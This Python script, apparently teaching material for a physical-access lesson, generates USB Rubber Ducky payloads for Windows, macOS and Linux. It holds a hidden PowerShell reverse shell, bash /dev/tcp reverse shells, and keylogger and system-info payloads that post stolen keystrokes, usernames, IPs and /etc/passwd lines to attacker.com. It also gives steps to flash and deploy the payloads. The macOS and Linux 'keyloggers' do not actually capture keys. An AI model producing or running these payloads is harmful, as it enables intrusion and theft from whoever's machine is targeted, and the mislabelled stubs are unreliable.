#!/usr/bin/env python3
"""
Script Name: usb_payload_generator.py
Lesson: 03 - Physical Access & Client-Side Attacks
Similar to: Rubber Ducky Encoder, Digispark payloads
Description: Generate USB attack payloads for various platforms

Usage:
    python3 usb_payload_generator.py --platform [windows|mac|linux] --payload [reverse_shell|keylogger|info_gather]
    python3 usb_payload_generator.py --platform windows --payload reverse_shell --lhost 192.168.1.100

Educational Notes:
    - Demonstrates HID attack vector
    - Shows platform-specific exploitation
    - Teaches payload encoding techniques
"""

import argparse
import base64
import json
from datetime import datetime

class USBPayloadGenerator:
    def __init__(self):
        self.payloads = {
            'windows': {
                'reverse_shell': self._windows_reverse_shell,
                'keylogger': self._windows_keylogger,
                'info_gather': self._windows_info_gather
            },
            'mac': {
                'reverse_shell': self._mac_reverse_shell,
                'keylogger': self._mac_keylogger,
                'info_gather': self._mac_info_gather
            },
            'linux': {
                'reverse_shell': self._linux_reverse_shell,
                'keylogger': self._linux_keylogger,
                'info_gather': self._linux_info_gather
            }
        }

    def _windows_reverse_shell(self, lhost, lport=4444):
        """Generate Windows PowerShell reverse shell"""
        ps_cmd = f"""
        $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{{0}};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
        }};
        $client.Close()
        """
        encoded = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        
        return f"""
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -e {encoded}
ENTER
"""

    def _windows_keylogger(self, webhook_url="http://attacker.com/log"):
        """Generate Windows keylogger payload"""
        return f"""
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $log=''; while($true){{$key=[System.Windows.Forms.Control]::ModifierKeys; if($key){{$log+='['+$key+']'}}; for($i=1;$i-le254;$i++){{if([System.Windows.Forms.Control]::IsKeyLocked($i)){{$log+=[char]$i}}}}; if($log.Length-gt100){{Invoke-WebRequest -Uri '{webhook_url}' -Method POST -Body @{{keys=$log}}; $log=''}}; Start-Sleep -Milliseconds 50}}
ENTER
"""

    def _windows_info_gather(self, webhook_url="http://attacker.com/data"):
        """Generate Windows information gathering payload"""
        return f"""
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING powershell -c "$info = @{{hostname=(hostname); user=$env:USERNAME; domain=$env:USERDOMAIN; os=(Get-WmiObject Win32_OperatingSystem).Caption; ip=(Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {{$_.IPAddress -ne $null}}).IPAddress[0]}}; Invoke-RestMethod -Uri '{webhook_url}' -Method POST -Body ($info | ConvertTo-Json)"
ENTER
"""

    def _mac_reverse_shell(self, lhost, lport=4444):
        """Generate macOS reverse shell"""
        return f"""
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
ENTER
"""

    def _mac_keylogger(self, webhook_url="http://attacker.com/log"):
        """Generate macOS keylogger payload"""
        keylogger_script = f'''
import subprocess
import time
import requests
import json

keys = ""
while True:
    try:
        # Use dtruss or similar to capture keystrokes
        # This is simplified - real keylogger would use IOKit
        result = subprocess.run(["system_profiler", "SPUSBDataType"], capture_output=True, text=True)
        if len(keys) > 100:
            requests.post("{webhook_url}", json={{"keys": keys, "host": "mac"}})
            keys = ""
        time.sleep(1)
    except:
        pass
'''
        encoded_script = base64.b64encode(keylogger_script.encode()).decode()
        
        return f"""
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING echo "{encoded_script}" | base64 -d | python3
ENTER
"""

    def _mac_info_gather(self, webhook_url="http://attacker.com/data"):
        """Generate macOS information gathering payload"""
        return f"""
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl -X POST {webhook_url} -H "Content-Type: application/json" -d "$(system_profiler SPSoftwareDataType SPHardwareDataType | python3 -c 'import sys,json; print(json.dumps({{\"data\": sys.stdin.read(), \"host\": \"mac\"}}))')"
ENTER
"""

    def _linux_reverse_shell(self, lhost, lport=4444):
        """Generate Linux reverse shell"""
        return f"""
DELAY 1000
CTRL ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
ENTER
"""

    def _linux_keylogger(self, webhook_url="http://attacker.com/log"):
        """Generate Linux keylogger payload"""
        return f"""
DELAY 1000
CTRL ALT t
DELAY 1000
STRING python3 -c "import subprocess,requests,time; [requests.post('{webhook_url}', json={{'keys': subprocess.getoutput('cat /proc/bus/input/devices'), 'host': 'linux'}}) for _ in iter(int, 1) if time.sleep(60)]" &
ENTER
"""

    def _linux_info_gather(self, webhook_url="http://attacker.com/data"):
        """Generate Linux information gathering payload"""
        return f"""
DELAY 1000
CTRL ALT t
DELAY 1000
STRING curl -X POST {webhook_url} -H "Content-Type: application/json" -d "$(uname -a; whoami; id; ifconfig; cat /etc/passwd | tail -5)"
ENTER
"""

    def generate_payload(self, platform, payload_type, **kwargs):
        """Generate payload for specified platform and type"""
        if platform not in self.payloads:
            raise ValueError(f"Unsupported platform: {platform}")
        
        if payload_type not in self.payloads[platform]:
            raise ValueError(f"Unsupported payload type for {platform}: {payload_type}")
        
        return self.payloads[platform][payload_type](**kwargs)

    def save_payload(self, payload, filename=None):
        """Save payload to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"usb_payload_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"[+] Payload saved to: {filename}")
        return filename

def main():
    parser = argparse.ArgumentParser(description="Generate USB attack payloads")
    parser.add_argument('--platform', choices=['windows', 'mac', 'linux'], required=True,
                       help='Target platform')
    parser.add_argument('--payload', choices=['reverse_shell', 'keylogger', 'info_gather'], 
                       required=True, help='Payload type')
    parser.add_argument('--lhost', help='Listening host for reverse shells')
    parser.add_argument('--lport', type=int, default=4444, help='Listening port')
    parser.add_argument('--webhook', default='http://attacker.com/log',
                       help='Webhook URL for data exfiltration')
    parser.add_argument('--output', help='Output filename')
    
    args = parser.parse_args()
    
    # Validate reverse shell requirements
    if args.payload == 'reverse_shell' and not args.lhost:
        parser.error("--lhost required for reverse shell payloads")
    
    generator = USBPayloadGenerator()
    
    try:
        kwargs = {}
        if args.payload == 'reverse_shell':
            kwargs = {'lhost': args.lhost, 'lport': args.lport}
        elif args.payload in ['keylogger', 'info_gather']:
            kwargs = {'webhook_url': args.webhook}
        
        payload = generator.generate_payload(args.platform, args.payload, **kwargs)
        filename = generator.save_payload(payload, args.output)
        
        print(f"[+] Generated {args.payload} payload for {args.platform}")
        print(f"[+] Instructions:")
        print(f"    1. Copy payload to USB Rubber Ducky")
        print(f"    2. Encode with: java -jar duckencoder.jar -i {filename} -o inject.bin")
        print(f"    3. Flash to device and deploy")
        print(f"\n[!] WARNING: Only use on systems you own or have permission to test!")
        
    except ValueError as e:
        print(f"[!] Error: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())